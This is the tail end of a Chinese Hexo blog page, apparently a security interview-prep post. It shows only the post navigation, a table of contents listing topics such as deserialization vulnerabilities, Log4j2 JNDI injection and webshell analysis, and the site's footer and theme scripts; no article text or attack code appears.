href="/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/" rel="tag">碎碎念</a></div><div class="post-nav"><a class="post-nav-prev" href="/2026/06/22/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" title="网络基础">上一篇<span>网络基础</span></a><a class="post-nav-next" href="/2026/06/22/%E9%A1%B9%E7%9B%AE%E6%B5%8B%E8%AF%95%E8%A7%84%E8%8C%83/" title="项目测试规范">下一篇<span>项目测试规范</span></a></div><div class="comment"><div id="waline"></div></div></div><aside id="post-sidebar" status="show"><div id="toc-container"><div class="toc-title"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"><span>目录</span></div><div class="toc-content" id="toc-div"><ol class="toc-list"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#1-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-list-text">1. PHP反序列化漏洞</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#2-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-list-text">2. Java反序列化漏洞</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#3-Java%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%E6%A6%82%E8%BF%B0"><span class="toc-list-text">3. Java框架安全风险概述</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#4-Apache-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88Shiro-550%E4%B8%8EShiro-721%EF%BC%89"><span class="toc-list-text">4. Apache Shiro反序列化漏洞（Shiro-550与Shiro-721）</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#5-Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-list-text">5. Fastjson反序列化漏洞</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#6-Apache-Struts2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EOGNL%E6%B3%A8%E5%85%A5"><span class="toc-list-text">6. Apache Struts2反序列化与OGNL注入</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#7-Spring%E7%B3%BB%E5%88%97%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-list-text">7. Spring系列反序列化漏洞</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#8-WebLogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-list-text">8. WebLogic反序列化漏洞</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#9-Log4j2%E6%BC%8F%E6%B4%9E%EF%BC%88JNDI%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-list-text">9. Log4j2漏洞（JNDI注入）</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#10-Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-list-text">10. Webshell流量分析</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#11-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90"><span class="toc-list-text">11. 内存马分析</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#12-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B8%8E%E6%BA%AF%E6%BA%90"><span class="toc-list-text">12. 应急响应与溯源</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#13-OWASP-Top-10%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%8E%9F%E7%90%86%E3%80%81%E6%94%BB%E5%87%BB%E3%80%81%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%EF%BC%89"><span class="toc-list-text">13. OWASP Top 10漏洞（原理、攻击、流量特征）</span></a></li></ol></div></div></aside></div></div><div id="toolbar" hide=""><div id="toolbar-setting-container" hide=""><div class="toolbar-item"><button id="tool-color-mode" title="深色模式" type="button"><img src="/assets/images/svg/ta/ta-moon.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button class="copy-text" id="tool-share" title="分享" type="button" data-text="http://example.com/2026/06/22/%E9%9D%A2%E8%AF%95/"><img src="/assets/images/svg/ta/ta-share.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-plus" title="放大字体" type="button"><img src="/assets/images/svg/ta/ta-text-plus.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-minus" title="缩小字体" type="button"><img src="/assets/images/svg/ta/ta-text-minus.svg" class="icon noview" alt="Icon"></button></div></div><div class="toolbar-container"><div class="toolbar-item"><button id="tool-setting" title="设置" type="button"><img src="/assets/images/svg/ta/ta-setting.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-toc" title="目录" type="button"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-gototop" title="返回顶部" type="button"><img src="/assets/images/svg/ta/ta-up.svg" class="icon noview" alt="Icon"></button></div></div></div><div class="search-overlay"><div class="search-container"><div class="search-header"><div class="search-title"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg>
+搜索</div><div class="search-close-btn"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 21a9 9 0 0 0 9 -9a9 9 0 0 0 -9 -9a9 9 0 0 0 -9 9a9 9 0 0 0 9 9z" /><path d="M9 8l6 8" /><path d="M15 8l-6 8" /></svg></div></div><div class="search-input-box"><input id="search-input" type="search" placeholder="请输入关键词进行站内搜索……" value="" maxlength="80"/></div><div class="search-result-container"><div class="search-result-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg></div></div></div></div><div id="music-player"></div></main><footer><div class="footer"><div id="footer-copyright">© 2026 <span>💗</span> <a href="/null">stackTang</a></div><div id="footer-info"><div id="footer-framework">🚀本站由 <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/chanwj/hexo-theme-meow" title="3.3.2" target="_blank">Meow</a> 强力驱动</div><div id="footer-runtime"><span id="runtime" data-startdate="2026-07-13T23:13:13.000Z">🌻已稳定运行.年.月.天</span></div></div></div></footer><div class="scripts"><script>const GLOBALCONFIG = {
+  root: '/',
+  toolbar: true,
+  lazyload_src: '/assets/images/Meow-Loading.webp',
+  friends: false,
+  album: '',
+  codeblock: true,
+  code_copy_text: false,
+  share_text: '🐱Share From Meow',
+  onblur_title: 'Please Come Back～✧(´▽`ʃ♡ƪ)',
+  mouse_click: false,
+  notify:{
+    enable: false,
+    info: '复制成功～转载请标注本文地址',
+    f12_info: '开发者模式已打开，请遵循本站版权协议'
+  },
+  search: {
+    enable: true,
+    path: 'search.xml',
+    local: {
+      top_n_per_article: 1,
+      preload: false
+    }
+  },
+  encrypt: false,
+  category: false,
+};
+</script><script>if (!localStorage.getItem('color-mode')) {
+  localStorage.setItem('color-mode', 'light' || 'light');
+}
+document.body.setAttribute('data-mode', localStorage.getItem('color-mode'));
+</script>
+<script src="/js/theme/tools/utils.js"></script>
+
+<script src="/js/plugins/dist/lazyload.min.js"></script>
+
+<script src="/js/plugins/view-image.min.js"></script>
+<script>if (localStorage.getItem('font-size')) {
+  document.querySelector('.post').style.fontSize = localStorage.getItem('font-size') + 'px';
+}
+</script><script>(() => {
+  let initFn = window.walineFn || null
+
+  const initWaline = (Fn) => {
+    const waline = Fn(Object.assign({
+      el: '#waline',
+      serverURL: 'https://dischat-9perr1k34-tangriweilis-projects.vercel.app',
+      lang: 'zh-CN',
+      dark: 'body[data-mode="dark"]',
+      emoji: null,
+      reaction: null,
+      path: window.location.pathname.replace(/([^\/#]+)(?:#.+|)$/,'$1/'),
+    }, null))
+  }
+
+  const loadWaline = async () => {
+    if (initFn) initWaline(initFn)
+    else {
+      let jsPath = ''
+      if (false) {
+        jsPath = 'dist/waline.js'
+      } else {
+        jsPath = '/js/plugins/dist/waline.js'
+      }
+      const { init } = await import(jsPath)
+      initFn = init || Waline.init
+      initWaline(initFn)
+      window.walineFn = initFn
+    }
+  }
+
+  if (true) {
+    meow.lazyloadFn(document.getElementById('waline'), loadWaline)
+  } else {
+    loadWaline()
+  }
+})()</script>
+<script src="/js/plugins/dist/APlayer.min.js"></script>
+<script>const initAplayer = (data) => {
+  if (!data.length) return;
+
+  const ap = new APlayer({
+    container: document.getElementById('music-player'),
+    fixed: true,
+    autoplay: false,
+    theme: '#FFB347',
+    loop: 'all',
+    order: 'list',
+    volume: 0.7,
+    lrcType: 3,
+    audio: data
+  });
+
+  ap.on('play', () => {
+    document.getElementById('music-player').setAttribute("play", "");
+  });
+  ap.on('pause', () => {
+    document.getElementById('music-player').removeAttribute("play");
+  });
+};
+
+const fetchData = () => {
+  fetch('')
+    .then(res => res.json())
+    .then(result => initAplayer(result));
+};
+
+if ('') {
+  document.addEventListener("DOMContentLoaded", fetchData);
+} else {
+  document.addEventListener("DOMContentLoaded", initAplayer());;
+}</script>
+<script src="/js/plugins/dist/search.js"></script>
+
+<script src="/js/main.js" type="module"></script>
+<script src="https://fastly.jsdelivr.net/npm/live2d-widget@3.1.4/lib/L2Dwidget.min.js"></script><script>(function () {
+  const initLive2D = function () {
+    if (!window.L2Dwidget) return;
+    window.L2Dwidget.init({"model":{"jsonPath":"https://fastly.jsdelivr.net/npm/live2d-widget-model-hijiki@1.0.5/assets/hijiki.model.json","scale":1},"display":{"position":"right","width":150,"height":300,"hOffset":150,"vOffset":-15},"mobile":{"show":true,"scale":0.55},"react":{"opacityDefault":0.88,"opacityOnHover":0.25}});
+  };
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initLive2D, { once: true });
+  } else {
+    initLive2D();
+  }
+})();</script></div></body></html>
